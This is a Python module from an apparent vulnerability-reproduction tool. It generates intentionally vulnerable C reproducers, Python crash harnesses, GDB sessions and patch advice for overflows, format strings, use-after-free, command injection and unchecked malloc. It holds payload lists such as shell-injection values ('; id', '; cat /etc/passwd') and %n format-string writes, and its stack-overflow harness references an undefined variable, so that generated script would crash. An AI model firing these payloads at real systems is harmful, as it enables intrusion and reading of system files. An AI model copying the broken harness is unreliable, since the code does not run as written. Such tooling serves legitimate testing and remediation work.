"""
memhack.poc_generator
──────────────────────
Generates actionable Proof-of-Concept artifacts for confirmed/candidate
vulnerabilities:

  • C reproducer   – minimal self-contained C program that triggers the bug
  • Python script  – subprocess-based harness to reproduce + capture crash
  • GDB commands   – ready-to-paste session that catches the fault
  • Mitigation     – concrete, finding-specific patch advice

Each PoC is keyed on the finding's CWE + detection source so the output
is contextually accurate rather than generic.
"""

from __future__ import annotations
import textwrap
from typing import Dict, Any

# ── PoC template registry ────────────────────────────────────────────────────

def _poc_bof_stack(finding: dict) -> Dict[str, str]:
    fname = finding.get("file", "target.c")
    line  = finding.get("line", 0)
    func  = _extract_func(finding.get("title", ""))
    buf_size = 64  # conservative; most stack bufs are ≤ 256

    c_code = textwrap.dedent(f"""\
        /*
         * PoC: Stack Buffer Overflow via {func}()
         * Finding: {finding.get('id','?')} – {finding.get('title','')}
         * File   : {fname}:{line}
         * CWE    : {finding.get('cwe','CWE-121')}
         *
         * Compile:  gcc -fsanitize=address -g -o poc poc_bof.c
         * Run:      ./poc $(python3 -c "print('A'*{buf_size + 24})")
         */
        #include <stdio.h>
        #include <string.h>
        #include <stdlib.h>

        /* Mirror of the vulnerable pattern detected in {fname} */
        void trigger(char *input) {{
            char buf[{buf_size}];
            {func}(buf, input);   /* ← overflow here */
            printf("buf = %s\\n", buf);
        }}

        int main(int argc, char **argv) {{
            if (argc < 2) {{
                fprintf(stderr, "Usage: %s <payload>\\n", argv[0]);
                return 1;
            }}
            printf("[*] Input length: %zu\\n", strlen(argv[1]));
            trigger(argv[1]);
            printf("[*] Survived (no ASan)\\n");
            return 0;
        }}
        """)

    py_code = textwrap.dedent(f"""\
        #!/usr/bin/env python3
        \"\"\"
        memhack automated reproducer
        Finding : {finding.get('id','?')} – {finding.get('title','')}
        \"\"\"
        import subprocess, sys, shlex

        BINARY = "./target"   # path to your ASan-instrumented binary
        SIZES  = [65, 80, 100, 128, 200, 256, 512, 1024]

        def run(payload: bytes) -> tuple[int, str]:
            try:
                r = subprocess.run(
                    [BINARY, payload.decode("latin-1", errors="replace")],
                    capture_output=True, timeout=5
                )
                out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
                return r.returncode, out
            except subprocess.TimeoutExpired:
                return -1, "TIMEOUT"

        for size in SIZES:
            payload = b"A" * size
            rc, out = run(payload)
            crashed = any(k in out for k in
                          ("heap-buffer-overflow", "stack-buffer-overflow",
                           "SIGSEGV", "AddressSanitizer", "Segmentation fault"))
            status = "💥 CRASH" if crashed else "  ok   "
            print(f"  {{status}} size={{size:>5}}  rc={{r.returncode}}")
            if crashed:
                print("\\n=== ASan output ===")
                print(out[:2000])
                print("===================")
                sys.exit(0)

        print("[-] No crash found with these sizes; try larger inputs or stdin fuzzing.")
        """)

    gdb_cmds = textwrap.dedent(f"""\
        # GDB session – Stack Buffer Overflow
        # Finding: {finding.get('id','?')} – {finding.get('title','')}
        #
        # 1. Compile WITHOUT sanitizers (raw crash):
        #    gcc -g -fno-stack-protector -o target_raw {fname}
        #
        # 2. Paste these commands into GDB:

        file ./target_raw
        set args $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*{buf_size + 24})")

        # Break just before the overflow
        break {func}
        run

        # After hit, inspect stack
        info frame
        x/32xw $rsp
        backtrace

        # Generate pattern to find exact offset
        # (requires pwndbg/peda, or use cyclic from pwntools)
        # python3 -c "from pwn import *; print(cyclic({buf_size + 100}).decode())"
        continue
        """)

    mitigation = textwrap.dedent(f"""\
        PATCH GUIDANCE – {finding.get('cwe','CWE-121')} Stack Buffer Overflow
        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        1. Replace {func}() with a bounds-checked alternative:
             strcpy  → strlcpy(dst, src, sizeof(dst))
             strcat  → strlcat(dst, src, sizeof(dst))
             sprintf → snprintf(dst, sizeof(dst), "%s", src)
             gets    → fgets(buf, sizeof(buf), stdin)

        2. Enable compile-time hardening:
             -fstack-protector-all   (stack canary)
             -D_FORTIFY_SOURCE=2     (glibc bounds checks)
             -fsanitize=address      (ASan for testing)
             -Wformat -Werror=format-security

        3. Consider using a safe string library:
             • SafeStr  https://github.com/coruus/safestr
             • libsafec https://github.com/rurban/safeclib
        """)

    return {"c": c_code, "python": py_code, "gdb": gdb_cmds, "mitigation": mitigation}


def _poc_format_string(finding: dict) -> Dict[str, str]:
    fname = finding.get("file", "target.c")
    line  = finding.get("line", 0)
    func  = _extract_func(finding.get("title", ""))

    c_code = textwrap.dedent(f"""\
        /*
         * PoC: Format String Vulnerability via {func}()
         * Finding: {finding.get('id','?')} – {finding.get('title','')}
         * File   : {fname}:{line}
         * CWE    : CWE-134
         *
         * Compile:  gcc -g -o poc poc_fmt.c
         * Run:      ./poc "%x.%x.%x.%x"
         *           ./poc "%n"          # write to arbitrary address
         */
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>

        /* Mirror of the vulnerable pattern */
        void vulnerable_print(char *user_input) {{
            {func}(user_input);   /* ← user input as format string */
        }}

        int main(int argc, char **argv) {{
            if (argc < 2) {{
                fprintf(stderr, "Usage: %s <format_payload>\\n", argv[0]);
                fprintf(stderr, "Try:   %s '%%x.%%x.%%x.%%x'\\n", argv[0]);
                return 1;
            }}
            printf("[*] Payload: %s\\n", argv[1]);
            vulnerable_print(argv[1]);
            printf("\\n[*] Done\\n");
            return 0;
        }}
        """)

    py_code = textwrap.dedent(f"""\
        #!/usr/bin/env python3
        \"\"\"
        memhack automated reproducer – Format String
        Finding : {finding.get('id','?')} – {finding.get('title','')}
        \"\"\"
        import subprocess, sys

        BINARY  = "./target"
        PAYLOADS = [
            "%x.%x.%x.%x",           # leak stack values
            "AAAA.%08x.%08x.%08x",   # locate 'AAAA' on stack
            "%.9999d",                # stack exhaustion
            "%s%s%s%s",               # may crash if ptr not valid
            "%n",                     # write crash (most dangerous)
            "%100$x",                 # direct parameter access
        ]

        for payload in PAYLOADS:
            try:
                r = subprocess.run(
                    [BINARY, payload],
                    capture_output=True, timeout=5
                )
                out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
                crashed  = r.returncode != 0 or "SIGSEGV" in out or "Segfault" in out
                leaked   = any(h in out for h in ["0x", "ffff", "7fff"])
                status   = "💥 CRASH" if crashed else ("🔍 LEAK" if leaked else "  ok  ")
                print(f"  {{status}}  payload: {{repr(payload)[:40]}}")
                if crashed or leaked:
                    print(f"         output : {{out[:300]}}")
            except subprocess.TimeoutExpired:
                print(f"  TIMEOUT  payload: {{repr(payload)[:40]}}")
        """)

    gdb_cmds = textwrap.dedent(f"""\
        # GDB session – Format String Vulnerability
        # Finding: {finding.get('id','?')} – {finding.get('title','')}

        file ./target
        set args "%x.%x.%x.%x.%x.%x.%x.%x"
        run

        # After crash or to inspect:
        info registers
        x/16xw $rsp    # look for your AAAA marker on the stack

        # Find offset of your AAAA marker:
        # set args "AAAA.%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x"
        # run  → find which %N$x shows 41414141

        # Then for arbitrary read:
        # set args "AAAA.%<N>$s"   # read string at address 0x41414141
        # set args "AAAA.%<N>$n"   # write to address 0x41414141
        """)

    mitigation = textwrap.dedent(f"""\
        PATCH GUIDANCE – CWE-134 Format String
        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        1. NEVER pass user input as the format string argument:
             WRONG:  printf(user_input);
             CORRECT: printf("%s", user_input);

        2. Static analysis flag:
             gcc -Wformat -Wformat-security -Werror=format-security

        3. Compile-time enforcement (GCC ≥ 4.0):
             __attribute__((format(printf, N, N+1)))
             on any wrapper function.

        4. For fprintf/sprintf: always use a compile-time string literal
           as the format argument.
        """)

    return {"c": c_code, "python": py_code, "gdb": gdb_cmds, "mitigation": mitigation}


def _poc_heap_bof(finding: dict) -> Dict[str, str]:
    fname = finding.get("file", "target.c")
    line  = finding.get("line", 0)

    c_code = textwrap.dedent(f"""\
        /*
         * PoC: Heap Buffer Overflow
         * Finding: {finding.get('id','?')} – {finding.get('title','')}
         * File   : {fname}:{line}
         * CWE    : CWE-122
         *
         * Compile:  gcc -fsanitize=address -g -o poc poc_heap.c
         * Run:      ./poc 200
         */
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>

        int main(int argc, char **argv) {{
            int  n   = argc > 1 ? atoi(argv[1]) : 10;
            char *buf = malloc(64);          /* fixed allocation */
            if (!buf) {{ perror("malloc"); return 1; }}

            printf("[*] malloc(64)  → buf @ %p\\n", (void*)buf);
            printf("[*] Writing %d bytes → overflow if n > 64\\n", n);

            memset(buf, 0x41, n);            /* ← overflow trigger  */
            buf[n] = '\\0';

            printf("[*] Done: %s\\n", buf);
            free(buf);
            return 0;
        }}
        """)

    py_code = textwrap.dedent(f"""\
        #!/usr/bin/env python3
        \"\"\"
        memhack automated reproducer – Heap Buffer Overflow
        Finding : {finding.get('id','?')} – {finding.get('title','')}
        \"\"\"
        import subprocess, sys

        BINARY = "./target"
        SIZES  = [65, 100, 128, 200, 512, 1024]

        for size in SIZES:
            r = subprocess.run([BINARY, str(size)], capture_output=True, timeout=5)
            out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
            crashed = "heap-buffer-overflow" in out or r.returncode != 0
            print(f"  {{'💥 CRASH' if crashed else '  ok   '}}  size={{size:>5}}")
            if crashed:
                print("\\n=== ASan output ===")
                print(out[:2000])
                sys.exit(0)
        """)

    gdb_cmds = textwrap.dedent(f"""\
        # GDB session – Heap Buffer Overflow
        # Finding: {finding.get('id','?')} – {finding.get('title','')}

        file ./target
        set args 200

        # Enable heap checking
        set environment MALLOC_CHECK_=3
        run

        info registers
        backtrace
        x/32xw $rsp
        # With ASan the report will show READ/WRITE of size N at heap address
        """)

    mitigation = textwrap.dedent(f"""\
        PATCH GUIDANCE – CWE-122 Heap Buffer Overflow
        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        1. Always validate the size before writing:
             if (n > sizeof_allocation) {{ /* error */ }}

        2. Use calloc() to zero-initialise + check overflow:
             buf = calloc(n, sizeof(char));

        3. For strings: use strndup() or asprintf().

        4. Enable compiler/linker mitigations:
             -fsanitize=address   (ASan – catches at runtime)
             -D_FORTIFY_SOURCE=2  (glibc bounds inline checks)
        """)

    return {"c": c_code, "python": py_code, "gdb": gdb_cmds, "mitigation": mitigation}


def _poc_uaf(finding: dict) -> Dict[str, str]:
    fname = finding.get("file", "target.c")
    line  = finding.get("line", 0)

    c_code = textwrap.dedent(f"""\
        /*
         * PoC: Use-After-Free
         * Finding: {finding.get('id','?')} – {finding.get('title','')}
         * File   : {fname}:{line}
         * CWE    : CWE-416
         *
         * Compile:  gcc -fsanitize=address -g -o poc poc_uaf.c
         * Run:      ./poc
         */
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>

        int main(void) {{
            char *buf = malloc(64);
            if (!buf) {{ perror("malloc"); return 1; }}

            strcpy(buf, "hello");
            printf("[*] Before free: %s @ %p\\n", buf, (void*)buf);

            free(buf);
            printf("[*] After free  (UAF read): %s\\n", buf);  /* ← UAF */

            /* Trigger write UAF */
            strcpy(buf, "pwned");   /* ← ASan will catch here */
            printf("[*] After write: %s\\n", buf);

            return 0;
        }}
        """)

    py_code = textwrap.dedent(f"""\
        #!/usr/bin/env python3
        \"\"\"
        memhack automated reproducer – Use-After-Free
        Finding : {finding.get('id','?')} – {finding.get('title','')}
        \"\"\"
        import subprocess, sys

        BINARY = "./target"
        r = subprocess.run([BINARY], capture_output=True, timeout=5)
        out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
        crashed = "heap-use-after-free" in out or r.returncode != 0
        print(f"Result: {{'💥 CONFIRMED UAF' if crashed else 'Not triggered'}}")
        if "heap-use-after-free" in out:
            print("\\n=== ASan output ===")
            print(out[:2000])
        """)

    gdb_cmds = textwrap.dedent(f"""\
        # GDB session – Use-After-Free
        # Finding: {finding.get('id','?')} – {finding.get('title','')}

        file ./target
        set environment MALLOC_CHECK_=3
        run

        # Set watchpoint on freed pointer value
        # After free(), note the address from the first printf
        # watch *0x<freed_address>
        backtrace
        info registers
        """)

    mitigation = textwrap.dedent(f"""\
        PATCH GUIDANCE – CWE-416 Use-After-Free
        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        1. Immediately NULL the pointer after free():
             free(ptr);
             ptr = NULL;

        2. Use a safe wrapper:
             #define SAFE_FREE(p) do {{ free(p); (p) = NULL; }} while(0)

        3. Consider smart/reference-counted patterns or GC libraries.

        4. Enable ASan (-fsanitize=address) in CI to catch UAF at test time.
        """)

    return {"c": c_code, "python": py_code, "gdb": gdb_cmds, "mitigation": mitigation}


def _poc_command_injection(finding: dict) -> Dict[str, str]:
    fname = finding.get("file", "target.c")
    line  = finding.get("line", 0)
    func  = _extract_func(finding.get("title", ""))

    c_code = textwrap.dedent(f"""\
        /*
         * PoC: Command Injection via {func}()
         * Finding: {finding.get('id','?')} – {finding.get('title','')}
         * File   : {fname}:{line}
         * CWE    : CWE-78
         *
         * Compile:  gcc -g -o poc poc_cmdinj.c
         * Run:      ./poc "; id"
         *           ./poc "$(id)"
         */
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>

        void vulnerable_exec(char *user_cmd) {{
            char cmd[512];
            snprintf(cmd, sizeof(cmd), "echo %s", user_cmd);  /* controllable */
            printf("[*] Executing: %s\\n", cmd);
            {func}(cmd);   /* ← injection point */
        }}

        int main(int argc, char **argv) {{
            if (argc < 2) {{
                fprintf(stderr, "Usage: %s <command_arg>\\n", argv[0]);
                fprintf(stderr, "Try:   %s '; id'\\n", argv[0]);
                return 1;
            }}
            vulnerable_exec(argv[1]);
            return 0;
        }}
        """)

    py_code = textwrap.dedent(f"""\
        #!/usr/bin/env python3
        \"\"\"
        memhack automated reproducer – Command Injection
        Finding : {finding.get('id','?')} – {finding.get('title','')}
        \"\"\"
        import subprocess, sys

        BINARY = "./target"
        PAYLOADS = [
            "; id",
            "$(id)",
            "`id`",
            "| id",
            "&& id",
            "; cat /etc/passwd",
            "\\n/bin/sh -c id",
        ]

        for payload in PAYLOADS:
            r = subprocess.run([BINARY, payload], capture_output=True, timeout=5)
            out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
            injected = "uid=" in out
            status = "💥 INJECTED" if injected else "  safe  "
            print(f"  {{status}}  {{repr(payload)}}")
            if injected:
                print(f"  Output: {{out[:200]}}")
        """)

    gdb_cmds = textwrap.dedent(f"""\
        # GDB session – Command Injection
        # Finding: {finding.get('id','?')} – {finding.get('title','')}

        file ./target
        set args "; id"
        break {func}
        run
        # Inspect argument to system()/popen()
        info args
        x/s $rdi    # on x86-64, first arg is rdi
        """)

    mitigation = textwrap.dedent(f"""\
        PATCH GUIDANCE – CWE-78 Command Injection
        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        1. Avoid system() / popen() entirely; use execv() with a fixed path:
             char *args[] = {{"/usr/bin/ls", "-l", NULL}};
             execv("/usr/bin/ls", args);

        2. If shell is required, whitelist the argument:
             if (strpbrk(input, "|;&`$<>")) {{ /* reject */ }}

        3. Sanitize with: allowlist of [A-Za-z0-9._-] only.

        4. Run the process in a chroot / seccomp sandbox.
        """)

    return {"c": c_code, "python": py_code, "gdb": gdb_cmds, "mitigation": mitigation}


def _poc_malloc_no_check(finding: dict) -> Dict[str, str]:
    fname = finding.get("file", "target.c")
    line  = finding.get("line", 0)

    c_code = textwrap.dedent(f"""\
        /*
         * PoC: NULL Pointer Dereference (unchecked malloc)
         * Finding: {finding.get('id','?')} – {finding.get('title','')}
         * File   : {fname}:{line}
         * CWE    : CWE-476
         *
         * Compile:  gcc -g -o poc poc_malloc.c
         * Run:      ./poc 9999999999    # huge alloc → malloc returns NULL
         */
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>

        int main(int argc, char **argv) {{
            size_t n = argc > 1 ? (size_t)atoll(argv[1]) : 9999999999ULL;
            printf("[*] Trying malloc(%zu)\\n", n);
            int *p = malloc(n * sizeof(int));    /* may return NULL */
            /* No NULL check here – mirrors the detected pattern */
            p[0] = 42;                           /* ← NULL deref if malloc failed */
            printf("[*] p[0] = %d\\n", p[0]);
            free(p);
            return 0;
        }}
        """)

    py_code = textwrap.dedent(f"""\
        #!/usr/bin/env python3
        \"\"\"
        memhack automated reproducer – Unchecked malloc
        Finding : {finding.get('id','?')} – {finding.get('title','')}
        \"\"\"
        import subprocess, sys

        BINARY = "./target"
        SIZES = ["9999999999", "999999999999", "18446744073709551615"]  # huge → NULL

        for size in SIZES:
            r = subprocess.run([BINARY, size], capture_output=True, timeout=5)
            out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
            crashed = r.returncode != 0 or "Segmentation" in out or "SIGSEGV" in out
            print(f"  {{'💥 NULL DEREF' if crashed else '  ok    '}}  alloc={{size}}")
            if crashed:
                print(f"  rc={{r.returncode}}  output={{out[:200]}}")
                sys.exit(0)
        """)

    gdb_cmds = textwrap.dedent(f"""\
        # GDB session – Unchecked malloc → NULL deref
        # Finding: {finding.get('id','?')} – {finding.get('title','')}

        file ./target
        set args 9999999999
        run

        # After crash (SIGSEGV):
        backtrace
        info registers
        print p        # should be 0x0 (NULL)
        """)

    mitigation = textwrap.dedent(f"""\
        PATCH GUIDANCE – CWE-476 NULL Pointer Dereference
        ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        1. Always check malloc/calloc/realloc return:
             int *p = malloc(n * sizeof(int));
             if (!p) {{ fprintf(stderr, "OOM\\n"); exit(1); }}

        2. Use a safe wrapper:
             void *xmalloc(size_t n) {{
                 void *p = malloc(n);
                 if (!p) {{ perror("malloc"); abort(); }}
                 return p;
             }}

        3. Check for integer overflow in the size argument before calling malloc.
        """)

    return {"c": c_code, "python": py_code, "gdb": gdb_cmds, "mitigation": mitigation}


def _poc_generic(finding: dict) -> Dict[str, str]:
    """Fallback PoC for findings without a specific template."""
    fname = finding.get("file", "target.c")
    line  = finding.get("line", 0)

    py_code = textwrap.dedent(f"""\
        #!/usr/bin/env python3
        \"\"\"
        memhack automated reproducer – Generic
        Finding : {finding.get('id','?')} – {finding.get('title','')}
        CWE     : {finding.get('cwe','?')}
        \"\"\"
        import subprocess, sys

        BINARY = "./target"   # replace with actual binary path
        SEEDS = [
            b"A" * 64, b"A" * 256, b"A" * 1024,
            b"%x.%x.%x", b"%n", b"; id",
            b"\\x00" * 8, b"\\xff" * 32,
            b"-1", b"0", b"2147483647",
        ]

        for seed in SEEDS:
            try:
                r = subprocess.run(
                    [BINARY],
                    input=seed, capture_output=True, timeout=5
                )
                out = (r.stdout + r.stderr).decode("latin-1", errors="replace")
                crashed = r.returncode != 0 or any(
                    k in out for k in ("SIGSEGV","AddressSanitizer","heap-","stack-","ERROR:")
                )
                if crashed:
                    print(f"[+] Crash with seed {{repr(seed[:40])}}")
                    print(out[:1000])
                    sys.exit(0)
            except subprocess.TimeoutExpired:
                pass

        print("[-] No crash with generic seeds. Manual analysis needed.")
        print(f"    Hint: {finding.get('description','')}")
        """)

    gdb_cmds = textwrap.dedent(f"""\
        # GDB session – {finding.get('title','')}
        # File: {fname}:{line}

        file ./target
        run

        backtrace
        info registers
        x/32xw $rsp
        """)

    mitigation = finding.get("mitigation", "Review the flagged code and apply defensive coding practices.")

    return {
        "c": f"/* No specific C reproducer for {finding.get('cwe','?')} – use the Python script. */",
        "python": py_code,
        "gdb": gdb_cmds,
        "mitigation": mitigation,
    }


# ── Helpers ──────────────────────────────────────────────────────────────────

def _extract_func(title: str) -> str:
    """Pull 'strcpy' from 'Dangerous function: strcpy()' etc."""
    import re
    m = re.search(r"(\w+)\(\)", title)
    if m:
        return m.group(1)
    for f in ("strcpy","strcat","gets","sprintf","vsprintf","printf","system",
              "popen","execl","execv","execvp","scanf","memcpy","strncpy"):
        if f in title.lower():
            return f
    return "vulnerable_func"


# ── CWE → template dispatch ──────────────────────────────────────────────────

_TEMPLATE_MAP = {
    "CWE-120": _poc_bof_stack,
    "CWE-121": _poc_bof_stack,
    "CWE-122": _poc_heap_bof,
    "CWE-134": _poc_format_string,
    "CWE-416": _poc_uaf,
    "CWE-415": _poc_uaf,    # double-free reuses UAF template
    "CWE-78":  _poc_command_injection,
    "CWE-476": _poc_malloc_no_check,
    "CWE-789": _poc_malloc_no_check,
}


# ── Public entry point ───────────────────────────────────────────────────────

def generate_poc(finding: dict) -> Dict[str, str]:
    """
    Generate PoC artifacts for a finding.

    Returns a dict with keys:
        c          – C source reproducer
        python     – Python subprocess harness
        gdb        – GDB command session
        mitigation – Concrete patch advice
    """
    cwe = finding.get("cwe", "")
    template_fn = _TEMPLATE_MAP.get(cwe, _poc_generic)

    # Prefer format-string template if title mentions it and CWE-134
    title_lower = finding.get("title", "").lower()
    if "format string" in title_lower:
        template_fn = _poc_format_string
    elif "command injection" in title_lower or finding.get("cwe") == "CWE-78":
        template_fn = _poc_command_injection

    return template_fn(finding)


def generate_all_pocs(findings: list) -> list:
    """
    Attach PoC artifacts to every finding in-place (adds 'poc' key).
    Returns the mutated findings list.
    """
    for finding in findings:
        finding["poc"] = generate_poc(finding)
    return findings
